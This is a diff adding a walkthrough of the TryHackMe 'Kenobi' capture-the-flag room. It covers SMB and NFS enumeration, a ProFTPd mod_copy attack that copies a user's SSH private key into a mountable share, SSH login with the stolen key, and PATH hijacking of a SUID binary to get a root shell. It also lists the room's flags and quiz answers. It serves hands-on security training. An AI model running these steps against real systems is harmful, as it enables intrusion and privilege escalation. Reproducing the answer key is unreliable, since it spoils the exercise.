@@ -1,0 +1,272 @@
+# TRY HACK ME
+
+## ROOM [ Kenobi ]
+
+---
+
+### Step 1 : Deploy the Machine
+
+Start the machine from TryHackMe and connect VPN using OpenVPN.
+
+sudo apt install openvpn
+
+sudo openvpn <file-name>.ovpn
+
+Start AttackBox + Machine and note the target IP.
+
+---
+
+### Step 2 : Nmap Recon
+
+We scan the target to find open ports.
+
+nmap -sT <IP>
+
+Result:
+- 7 open ports found
+
+---
+
+### Step 3 : SMB Enumeration
+
+We check SMB shares using nmap scripts.
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
+
+Result:
+- 3 shares found
+
+Shares:
+- IPC$
+- anonymous
+- print$
+
+---
+
+### Step 4 : SMB Access
+
+Connect to anonymous share:
+
+smbclient //<IP>/anonymous
+
+We find:
+- log.txt
+
+Inside log.txt we discover:
+- SSH key information
+- ProFTPd information
+
+---
+
+### Step 5 : SMB Download
+
+Download files:
+
+smbget -R smb://<IP>/anonymous
+
+Open log.txt → reveals important system info.
+
+---
+
+### Question: What file is found?
+Answer: log.txt
+
+---
+
+### Step 6 : FTP Service Info
+
+From enumeration we find FTP running on:
+
+Port: 21
+
+---
+
+### Step 7 : NFS Enumeration (RPC 111)
+
+We check NFS shares:
+
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
+
+Result:
+- /var mount available
+
+---
+
+### Question: What mount can we see?
+Answer: /var
+
+---
+
+### Step 8 : ProFTPd Version Discovery
+
+We connect using netcat to FTP and identify version.
+
+nc <IP> 21
+
+Result:
+ProFTPd version: 1.3.5
+
+---
+
+### Question: What is the version?
+Answer: 1.3.5
+
+---
+
+### Step 9 : Search Exploits
+
+Using searchsploit:
+
+searchsploit proftpd 1.3.5
+
+Result:
+- 4 exploits found
+
+---
+
+### Question: How many exploits exist?
+Answer: 4
+
+---
+
+### Step 10 : Exploitation (mod_copy)
+
+We use ProFTPd mod_copy feature:
+
+SITE CPFR /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
+
+Now file is copied into /var mount.
+
+---
+
+### Step 11 : Mount NFS Share
+
+We mount /var directory:
+
+mkdir /mnt/kenobi
+mount <IP>:/var /mnt/kenobi
+ls -la /mnt/kenobi/tmp
+
+We find:
+- id_rsa
+
+---
+
+### Step 12 : SSH Login
+
+Use private key to login:
+
+ssh -i id_rsa kenobi@<IP>
+
+Now we have user access.
+
+---
+
+### Step 13 : User Flag
+
+cat /home/kenobi/user.txt
+
+---
+
+### USER FLAG
+
+d0b0f3f53b6caa532a83915e19224899
+
+---
+
+### Step 14 : SUID Enumeration
+
+We search for SUID binaries:
+
+find / -perm -u=s -type f 2>/dev/null
+
+We find unusual binary:
+/usr/bin/menu
+
+---
+
+### Question: What file is unusual?
+Answer: /usr/bin/menu
+
+---
+
+### Step 15 : Run Binary
+
+Execute:
+
+/usr/bin/menu
+
+We see:
+- 3 options
+
+---
+
+### Question: How many options appear?
+Answer: 3
+
+---
+
+### Step 16 : Privilege Escalation (Path Hijacking)
+
+We inspect binary behavior using strings and find it uses system commands like:
+
+curl
+uname
+
+We exploit PATH variable.
+
+---
+
+### Exploit Steps:
+
+Create malicious curl:
+
+cd /tmp
+echo "/bin/sh" > curl
+chmod 777 curl
+
+Modify PATH:
+
+export PATH=/tmp:$PATH
+
+Run menu again → root shell spawns.
+
+---
+
+### Step 17 : Root Flag
+
+cat /root/root.txt
+
+---
+
+### ROOT FLAG
+
+177b3cd8562289f37382721c28381f02
+
+---
+
+### Final Answers Summary
+
+- Open ports: 7
+- SMB shares: 3
+- SMB file: log.txt
+- FTP port: 21
+- NFS mount: /var
+- ProFTPd version: 1.3.5
+- Exploits: 4
+- SUID file: /usr/bin/menu
+- user.txt: d0b0f3f53b6caa532a83915e19224899
+- root.txt: 177b3cd8562289f37382721c28381f02
+
+---
+
+### Conclusion
+
+This room teaches:
+- SMB enumeration
+- NFS exploitation
+- FTP service discovery
+- ProFTPd mod_copy attack
+- SUID privilege escalation
+- PATH hijacking technique
